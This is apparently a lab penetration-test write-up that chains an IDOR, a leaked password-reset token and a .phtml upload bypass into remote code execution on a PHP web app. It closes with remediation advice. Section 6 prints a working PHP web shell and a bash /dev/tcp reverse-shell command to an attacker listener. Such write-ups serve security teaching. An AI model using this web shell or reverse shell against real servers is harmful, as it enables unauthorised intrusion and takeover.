# Write-Up — Chaining Web Vulnerabilities to Full Server Compromise

> **Type:** Web Application Penetration Test
> **Target:** `10.129.144.143` / `10.129.130.69`
> **Tools:** Nmap, Gobuster, curl, Burp Suite, Netcat
> **Final Result:** Reverse shell on the web server via a chain of IDOR → Broken Password Reset → Upload Bypass → RCE

---

## 1. Introduction

The target is a **PHP/MySQL web application** exposing several services. The goal of the engagement was to assess the application's security posture and, where possible, demonstrate a complete exploitation path leading to full server compromise.

This exercise illustrates a key pentesting principle: **no single vulnerability led to full compromise on its own**. It was the chaining of several medium-to-critical weaknesses that ultimately resulted in RCE.

---

## 2. Reconnaissance

### 2.1 Port Scanning — Nmap

```bash
nmap -sC -sV -p- 10.129.144.143
```

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | SSH | Standard remote access |
| 80/tcp | HTTP | Main web application |
| 3306/tcp | MySQL | Database exposed externally |
| 8080/tcp | Apache (HTTP) | Secondary service |

### 2.2 Application Fingerprinting

```bash
curl -I http://10.129.144.143
```

Headers reveal the technology stack (Apache + PHP). The `PHPSESSID` cookie confirms standard server-side session management.

### 2.3 Directory Enumeration — Gobuster

```bash
gobuster dir -u http://10.129.144.143 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x php
```

Endpoints of interest:

- `/login.php`
- `/register.php`
- `/profile.php`
- `/reset.php` *(password reset page)*
- `/admin/` *(administrator panel)*
- `/uploads/` *(upload directory)*
- `/api/` *(REST API)*

### 2.4 Account Creation

Registration is open. A test account is created to explore the authenticated area and obtain a valid `PHPSESSID`.

### 2.5 Exploring the API

```bash
curl http://10.129.144.143/api/
```

The `/api/` endpoint exposes the list of available routes (`/api/user`, `/api/users`, etc.) — an **information disclosure** that dramatically simplifies enumeration.

---

## 3. IDOR — Insecure Direct Object Reference

### 3.1 Detection

Once authenticated, the profile page renders user data through:

```
http://10.129.144.143/profile.php?id=6
```

The `id` parameter is interpolated directly with no authorization check. Changing the value gives access to other users' profiles.

### 3.2 Enumerating All Users

Through the profile page:

```bash
curl -s -b "PHPSESSID=gs5ngd6duukc09agpdnj1o9tt2" \
  "http://10.129.144.143/profile.php?id=1" | grep "fw-semibold"
```

Through the API (cleaner — no HTML to parse):

```bash
curl -s "http://10.129.144.143/api/user?id=1"
```

By iterating over `id=1..N`, we extract:

- First name, last name
- Email address
- Role (`user` / `admin`)
- Username

User **`id=1`** is the administrator. The **admin email** is the key piece of information for the next pivot.

> **Severity: High.** IDOR alone does not grant access, but it provides the material to target the administrator.

---

## 4. Weak Password Reset

### 4.1 Understanding the Reset Flow

On `/reset.php`, the user submits an email address. The expected behavior is that a random token would be sent **exclusively via email**.

Here, by intercepting the request with Burp (or simply reading the returned HTML), we observe that the **reset token is returned directly in the HTTP response** upon submission.

### 4.2 Exploitation

1. Submit the reset form with the admin email obtained via the IDOR.
2. The response contains the token (or a URL containing the token), e.g.:

   ```
   http://10.129.144.143/reset.php?token=abc123...
   ```

3. Visit the URL and set a new password for the admin account.
4. If the token were short or predictable (timestamp, sequence), brute-forcing would be feasible. Here, direct exposure makes brute-force unnecessary.

### 4.3 Logging in as Administrator

```
Username: admin
Password: <new_password>
```

> **Severity: Critical.** A reset token must NEVER appear in the HTTP response sent to the browser.

---

## 5. Admin Panel Access & File Upload

### 5.1 Exploring the Dashboard

The `/admin/` panel exposes several features, including a **document upload function**.

### 5.2 Client-Side Restriction

The upload form uses `accept=".pdf,.doc,.docx"` and a JavaScript check on the extension. Trivial to bypass:

- Disable JavaScript, **or**
- Intercept with Burp and modify the extension after the JS check.

### 5.3 Server-Side Restriction — Incomplete Blocklist

On the server side, the filter relies on an **extension blocklist** (`.php`, `.php3`, `.php5`, `.phar`, etc.). The list is incomplete: it **omits `.phtml`**, which is executed as PHP by Apache in the default configuration.

> **Key lesson:** Always use an **allowlist**, never a blocklist. Validate file content (MIME, magic bytes) — not just the extension.

---

## 6. Remote Code Execution

### 6.1 Preparing the Web Shell

`shell.phtml`:

```php
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

### 6.2 Upload & Command Execution

Upload the file through the admin panel. It lands in `/uploads/documents/shell.phtml`.

Executing commands:

```bash
curl "http://10.129.130.69/uploads/documents/shell.phtml?cmd=whoami"
curl "http://10.129.130.69/uploads/documents/shell.phtml?cmd=hostname"
curl "http://10.129.130.69/uploads/documents/shell.phtml?cmd=id"
```

Commands execute under the Apache user context (typically `www-data`).

### 6.3 Reverse Shell

**On the attacker machine** — open a listener:

```bash
nc -lvnp 4444
```

**On the target** — trigger a bash reverse shell via the web shell:

```bash
curl "http://10.129.130.69/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/CONNECTION_IP/4444+0>%261'"
```

At this point: **interactive shell on the server**. Compromise is complete at the Apache user level — a post-exploitation / privilege escalation phase would follow.

> **Severity: Critical.** Authenticated RCE on the web server.

---

## 7. Full Attack Chain

```
[ Enumeration ]
       │
       ▼
[ IDOR on /profile.php?id= and /api/user?id= ]
       │  → Admin email extracted
       ▼
[ Weak Password Reset ]
       │  → Token leaked in HTTP response
       │  → Admin password reset
       ▼
[ Admin authentication ]
       │
       ▼
[ Arbitrary upload — incomplete blocklist ]
       │  → Bypass via .phtml
       ▼
[ Remote Code Execution ]
       │
       ▼
[ Reverse shell — server compromise ]
```

**Key point for the report:** No single vulnerability allows full compromise on its own.

- The IDOR leaks information but does not grant access.
- The broken password reset is exploitable but useless without the admin email.
- The upload bypass requires admin credentials.

It is the **chaining** that turns three manageable weaknesses into a critical compromise.

---

## 8. Remediation Summary

| # | Vulnerability | Severity | Remediation |
|---|---------------|----------|-------------|
| 1 | IDOR on `/profile.php` and `/api/user` | **High** | Enforce server-side authorization on every request. Verify that the authenticated user has permission to access the requested resource. Implement role-based access control (RBAC) and/or resource-ownership checks. |
| 2 | Reset token exposed in the HTTP response | **Critical** | Send reset tokens **exclusively via email**. The web page should display only a generic message such as *"If the address exists, an email has been sent"*. Use cryptographically random tokens of **at least 32 characters**, with a **short lifetime** (15–30 minutes) and **single use**. |
| 3 | Incomplete file extension blocklist | **Critical** | Use an **allowlist** (`.pdf`, `.docx`, `.png`, etc.). Validate the **actual file content** (magic bytes / MIME type). Store uploaded files **outside the web root** or disable PHP execution in the `/uploads` directory (`php_flag engine off` or the nginx equivalent). Rename files on upload to prevent conflicts. |
| 4 | `/api/` endpoint exposing the route index | **Medium** | Remove the public index or restrict it to authenticated administrators. Do not expose the internal route structure to unauthenticated users. |
| 5 | MySQL exposed on port 3306 | **Medium** | Bind MySQL to `127.0.0.1` or to a private network. Filter port 3306 at the firewall level. |

---

## 9. Conclusion

This lab is a textbook illustration of **defense in depth**: each faulty layer of the application contributed to the final compromise. Fixing any single one of these issues would have been enough to **break the chain**:

- Proper authorization checks ⇒ no IDOR ⇒ no admin email leaked.
- Reset tokens sent only by email ⇒ no admin account takeover.
- Upload allowlist ⇒ no RCE.

This is the key takeaway for the client report: **security is not just about patching critical vulnerabilities in isolation**. A stack of "minor" findings can produce a "critical" impact.
